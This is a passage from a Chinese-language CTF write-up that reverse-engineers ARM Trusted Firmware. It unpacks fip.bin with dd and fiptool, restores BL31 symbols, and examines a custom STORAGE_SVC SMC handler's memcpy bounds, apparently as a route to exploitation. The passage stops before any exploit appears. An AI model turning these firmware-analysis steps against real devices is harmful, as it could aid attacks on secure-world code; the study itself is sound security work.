</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(;</span> <span class="n">start_idx</span> <span class="o">&lt;=</span> <span class="n">end_idx</span><span class="p">;</span> <span class="n">start_idx</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="n">rt_svc_descs_indices</span><span class="p">[</span><span class="n">start_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * This function combines the call type and the owning entity number
</span></span></span><span class="line"><span class="cl"><span class="cm"> * corresponding to a runtime service to generate a unique owning entity number.
</span></span></span><span class="line"><span class="cl"><span class="cm"> * This unique oen is used to access an entry in the &#39;rt_svc_descs_indices&#39;
</span></span></span><span class="line"><span class="cl"><span class="cm"> * array. The entry contains the index of the service descriptor in the
</span></span></span><span class="line"><span class="cl"><span class="cm"> * &#39;rt_svc_descs&#39; array.
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">uint32_t</span> <span class="nf">get_unique_oen</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">oen</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">call_type</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="p">((</span><span class="n">call_type</span> <span class="o">&amp;</span> <span class="n">FUNCID_TYPE_MASK</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">FUNCID_OEN_WIDTH</span><span class="p">)</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl">		<span class="p">(</span><span class="n">oen</span> <span class="o">&amp;</span> <span class="n">FUNCID_OEN_MASK</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><h3 id="执行环境">执行环境<a hidden class="anchor" aria-hidden="true" href="#执行环境">#</a></h3>
<p>在ARM TrustZone架构下，系统被分为两个主要的世界：</p>
<ul>
<li><strong>Secure World（安全世界）</strong>：即TEE（Trusted Execution Environment，可信执行环境），是受保护的操作系统和应用程序的执行环境，如 <strong>OP-TEE</strong>（可信执行环境）等。这个环境对系统的敏感数据进行加密和保护，避免受到恶意软件或攻击。</li>
<li><strong>Non-Secure World（非安全世界）</strong>：即REE（Rich Execution Environment，富执行环境），是普通的应用执行环境。在 REE 中，操作系统和应用程序运行在不受硬件级别保护的环境中，这些程序对安全世界中的敏感数据没有直接访问权限。</li>
</ul>
<h3 id="smc-calls">smc calls<a hidden class="anchor" aria-hidden="true" href="#smc-calls">#</a></h3>
<p>由github我们能获取到<code>smc</code>指令的用户手册：<a href="http://infocenter.arm.com/help/topic/com.arm.doc.den0028b/ARM_DEN0028B_SMC_Calling_Convention.pdf">SMC Calling Convention</a></p>
<p>根据文档得知，在 ARM 架构中，同步控制通过安全监控调用（Secure Monitor Call, SMC）异常在正常的非安全状态和安全状态之间进行转换。SMC 异常是由 SMC 指令生成的，并由安全监控处理。安全监控的操作由通过寄存器传递的参数决定。</p>
<p>定义了两种类型的调用：</p>
<ul>
<li><strong>快速调用</strong>（fast calls）：执行原子操作。从调用处理器（PE）的角度来看，该调用是原子的，并且在请求的操作完成后返回。</li>
<li><strong>让步调用</strong>（yielding calls）：<strong>启动的操作可以被非安全中断抢占</strong>。该调用可以在请求的操作完成之前返回。</li>
</ul>
<p>附录 A 提供了处理让步调用的示例。</p>
<p>每次 SMC/HVC 调用时都会传递功能标识符，它决定了：</p>
<ul>
<li>要调用的服务</li>
<li>要调用的功能</li>
<li>使用的调用约定（32 位/64 位）</li>
<li>使用的调用类型（快速调用/让步调用）</li>
</ul>
<p>调用者请求的功能使用 32 位整数值表示。它始终作为第一个参数传递给每个 SMC 或 HVC 调用，在 R0 或 W0 寄存器中。该 32 位值中的几个位具有特定的含义，如下表所示：</p>
<img src="./img/trust_storage_wp/image-20250228154946122.png" alt="image-20250228154946122" style="zoom:50%;" />
<p>当使用 SMC64/HVC64 协议时，SMC 或 HVC 指令最多可以在寄存器中传递6个 64 位参数，并且可以在寄存器中返回最多4个 64 位值。（对于来自 EL2 的 SMC 调用，可以添加一个可选的第7个 32 位参数client ID在W07）。</p>
<p>当从 AArch64 状态发起 SMC64/HVC64 调用时：</p>
<ul>
<li>函数标识符通过寄存器 W0 传递。</li>
<li>参数通过寄存器 X1-X6 传递。</li>
<li>结果通过寄存器 X0-X3 返回。</li>
<li>寄存器 X18-X30 和栈指针<code>SP_EL0</code>以及<code>SP_ELx</code>被callee保存，并且必须在 SMC 或 HVC 调用期间保持不变。</li>
</ul>
<p>在 ARM 架构中，SMC 指令用于从非安全世界（EL1 或 EL0）调用安全世界（通常是 EL3）。因此，<strong>调用 SMC 指令时需要确保当前 CPU 正在执行在 EL1 或 EL0 中</strong>。</p>
<h2 id="解包">解包<a hidden class="anchor" aria-hidden="true" href="#解包">#</a></h2>
<p>参考：<a href="https://www.iotsec-zone.com/article/479">Draytek3910 固件解密及漏洞分析</a></p>
<p>参考ATF 启动流程，CPU 会先执行 BL1，BL1 通常被烧录在 ROM 中，BL1 完成初始化工作之后会通过 UUID 查找其他 BL 的位置，BL2、BL3、系统镜像等部分被单独打包在 fip.bin，存放到 flash 内。考虑到关键部分应该在 fip.bin，所以要想办法找到此文件并解包。
查看<a href="https://github.com/ARM-software/arm-trusted-firmware.git">ATF arm64的源码</a>，由<code>include\tools_share\firmware_image_package.h</code>可知，fip.bin 以<code>0xAA640001</code>开头：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* This is used as a signature to validate the blob header */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define TOC_HEADER_NAME	0xAA640001</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>010editor中找到偏移位置：</p>
<p><img alt="image-20250303083753669" loading="lazy" src="./img/trust_storage_wp/image-20250303083753669.png"></p>
<p>使用<code>dd</code>工具提取fip.bin：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dd <span class="k">if</span><span class="o">=</span>flash.bin <span class="nv">of</span><span class="o">=</span>fip.bin <span class="nv">skip</span><span class="o">=</span><span class="m">262144</span> <span class="nv">bs</span><span class="o">=</span><span class="m">1</span> <span class="c1"># 0x40000=262144</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>之后使用官方解包工具<code>fiptool</code>进行解包：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 查看信息</span>
</span></span><span class="line"><span class="cl">~/Tools/arm-trusted-firmware/tools/fiptool/fiptool info ./fip.bin 
</span></span><span class="line"><span class="cl">Trusted Boot Firmware BL2: <span class="nv">offset</span><span class="o">=</span>0x128, <span class="nv">size</span><span class="o">=</span>0x6439, <span class="nv">cmdline</span><span class="o">=</span><span class="s2">&#34;--tb-fw&#34;</span>
</span></span><span class="line"><span class="cl">EL3 Runtime Firmware BL31: <span class="nv">offset</span><span class="o">=</span>0x6561, <span class="nv">size</span><span class="o">=</span>0xD07C, <span class="nv">cmdline</span><span class="o">=</span><span class="s2">&#34;--soc-fw&#34;</span>
</span></span><span class="line"><span class="cl">Secure Payload BL32 <span class="o">(</span>Trusted OS<span class="o">)</span>: <span class="nv">offset</span><span class="o">=</span>0x135DD, <span class="nv">size</span><span class="o">=</span>0x1C, <span class="nv">cmdline</span><span class="o">=</span><span class="s2">&#34;--tos-fw&#34;</span>
</span></span><span class="line"><span class="cl">Secure Payload BL32 Extra1 <span class="o">(</span>Trusted OS Extra1<span class="o">)</span>: <span class="nv">offset</span><span class="o">=</span>0x135F9, <span class="nv">size</span><span class="o">=</span>0x88378, <span class="nv">cmdline</span><span class="o">=</span><span class="s2">&#34;--tos-fw-extra1&#34;</span>
</span></span><span class="line"><span class="cl">Non-Trusted Firmware BL33: <span class="nv">offset</span><span class="o">=</span>0x9B971, <span class="nv">size</span><span class="o">=</span>0x200000, <span class="nv">cmdline</span><span class="o">=</span><span class="s2">&#34;--nt-fw&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 解包</span>
</span></span><span class="line"><span class="cl">~/Tools/arm-trusted-firmware/tools/fiptool/fiptool unpack ./fip.bin 
</span></span><span class="line"><span class="cl"><span class="c1"># 可以只解包一部分</span>
</span></span><span class="line"><span class="cl">~/Tools/arm-trusted-firmware/tools/fiptool/fiptool unpack --soc-fw ./fip.bin</span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><h2 id="逆向分析">逆向分析<a hidden class="anchor" aria-hidden="true" href="#逆向分析">#</a></h2>
<h3 id="恢复符号">恢复符号<a hidden class="anchor" aria-hidden="true" href="#恢复符号">#</a></h3>
<p>首先通过字符串判断出使用的是v2.10.0版本的源码：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">strings flash.bin <span class="p">|</span> grep v2<span class="se">\.</span>             
</span></span><span class="line"><span class="cl">v2.10.0	<span class="o">(</span>debug<span class="o">)</span>:v2.10-dirty</span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>下载源码编译带符号的二进制文件：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://github.com/ARM-software/arm-trusted-firmware/archive/refs/tags/v2.10.0.zip
</span></span><span class="line"><span class="cl">unzip v2.10.0.zip
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> arm-trusted-firmware-2.10.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">ARCH</span><span class="o">=</span>arm64
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">CROSS_COMPILE</span><span class="o">=</span>aarch64-linux-gnu-
</span></span><span class="line"><span class="cl">make <span class="nv">PLAT</span><span class="o">=</span>qemu <span class="nv">DEBUG</span><span class="o">=</span><span class="m">1</span> <span class="nv">V</span><span class="o">=</span><span class="m">1</span> <span class="nv">DISABLE_BIN_GENERATION</span><span class="o">=</span><span class="m">1</span> <span class="c1"># 生成elf可执行文件而非bin镜像文件</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>编译好的文件在<code>build/qemu/debug/bl31/bl31.elf</code>路径下，用IDA打开，导出符号文件，再在IDA我们提取的镜像文件中加载符号，能够恢复部分符号，但仍然有一部分需要自己去逆向添加。</p>
<h3 id="rt_svc_desc_t">rt_svc_desc_t<a hidden class="anchor" aria-hidden="true" href="#rt_svc_desc_t">#</a></h3>
<p>对比源码，通过字符串<code>&quot;\nInvalid runtime service descriptor %p\n&quot;</code>找到函数<code>runtime_svc_init</code>对应<code>sub_5874</code>，进而找到handler列表<code>rt_svc_descs</code>偏移为<code>0xC120</code>，IDA恢复相关结构体：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">signed</span> <span class="kt">char</span>        <span class="kt">int8_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">short</span>              <span class="kt">int16_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">int</span>                <span class="kt">int32_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">long</span> <span class="kt">long</span>          <span class="kt">int64_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span>      <span class="kt">uint8_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">short</span>     <span class="kt">uint16_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">int</span>       <span class="kt">uint32_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="kt">uint64_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="kt">uintptr_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">u_register_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">uintptr_t</span> <span class="p">(</span><span class="o">*</span><span class="kt">rt_svc_handle_t</span><span class="p">)(</span><span class="kt">uint32_t</span> <span class="n">smc_fid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				  <span class="kt">u_register_t</span> <span class="n">x1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				  <span class="kt">u_register_t</span> <span class="n">x2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				  <span class="kt">u_register_t</span> <span class="n">x3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				  <span class="kt">u_register_t</span> <span class="n">x4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				  <span class="kt">void</span> <span class="o">*</span><span class="n">cookie</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				  <span class="kt">void</span> <span class="o">*</span><span class="n">handle</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				  <span class="kt">u_register_t</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">int32_t</span> <span class="p">(</span><span class="o">*</span><span class="kt">rt_svc_init_t</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">rt_svc_desc</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">uint8_t</span> <span class="n">start_oen</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">uint8_t</span> <span class="n">end_oen</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">uint8_t</span> <span class="n">call_type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">rt_svc_init_t</span> <span class="n">init</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">rt_svc_handle_t</span> <span class="n">handle</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="kt">rt_svc_desc_t</span><span class="p">;</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>恢复<code>rt_svc_descs</code>，可以看到两个自己实现的服务<code>STORAGE_SVC</code>和<code>LOG_SVC</code>。（如果一开始没有设定加载地址，需要rebase到<code>0xE0A0000</code>才能正确识别地址）</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AC120</span> <span class="p">;</span> <span class="kt">rt_svc_desc_t</span> <span class="n">rt_svc_descs</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AC120</span> <span class="n">rt_svc_descs</span>    <span class="kt">rt_svc_desc_t</span> <span class="o">&lt;</span><span class="mi">9</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">aStorageSvc</span><span class="p">,</span> <span class="n">STORAGE_SVC_init</span><span class="p">,</span> \
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AC120</span>                                         <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">sub_E0A5874</span><span class="o">+</span><span class="mi">18</span><span class="err">↑</span><span class="n">o</span> <span class="p">;</span> <span class="s">&#34;STORAGE_SVC&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AC120</span>                                <span class="n">STORAGE_SVC_handler</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AC140</span>                 <span class="kt">rt_svc_desc_t</span> <span class="o">&lt;</span><span class="mi">7</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">aLogSvc</span><span class="p">,</span> <span class="n">LOG_SVC_init</span><span class="p">,</span> <span class="n">LOG_SVC_handler</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">&#34;LOG_SVC&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AC160</span>                 <span class="kt">rt_svc_desc_t</span> <span class="o">&lt;</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">aArmArchSvc</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sub_E0A016C</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">&#34;arm_arch_svc&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AC180</span>                 <span class="kt">rt_svc_desc_t</span> <span class="o">&lt;</span><span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">aOpteedStd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sub_E0A3948</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">&#34;opteed_std&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AC1A0</span>                 <span class="kt">rt_svc_desc_t</span> <span class="o">&lt;</span><span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">aOpteedFast</span><span class="p">,</span> <span class="n">sub_E0A38D0</span><span class="p">,</span> <span class="n">sub_E0A3948</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">&#34;opteed_fast&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nl">ROM</span><span class="p">:</span><span class="mf">000000000E0</span><span class="n">AC1C0</span>                 <span class="kt">rt_svc_desc_t</span> <span class="o">&lt;</span><span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">aStdSvc</span><span class="p">,</span> <span class="n">sub_E0A5BF8</span><span class="p">,</span> <span class="n">sub_E0A5C1C</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">&#34;std_svc&#34;</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>由于没有正确识别<code>0xE0D....</code>的地址段，故我自己在<code>0xE0D6000~0xE0D7FFF</code>添加了一个段。</p>
<h3 id="storage_svc">STORAGE_SVC<a hidden class="anchor" aria-hidden="true" href="#storage_svc">#</a></h3>
<p><code>STORAGE_SVC</code>的功能有2个：</p>
<ol>
<li><code>smc_fid == 0xC9000031</code>：<code>memcpy(&amp;storage_svc_list[x1], x2, x3)</code></li>
<li><code>smc_fid == 0xC9000032</code>：<code>memcpy(x2, &amp;storage_svc_list[x1], x3)</code></li>
</ol>
<p><code>storage_svc_list[0x10]</code>为0x40大小的结构体数组，要求：</p>
<ul>
<li><code>x1 &lt;= 0xf</code></li>
<li><code>is_secure(x2) == False</code></li>
<li>``x3 &lt;= 0x40`</li>
</ul>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">STORAGE_SVC_init</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
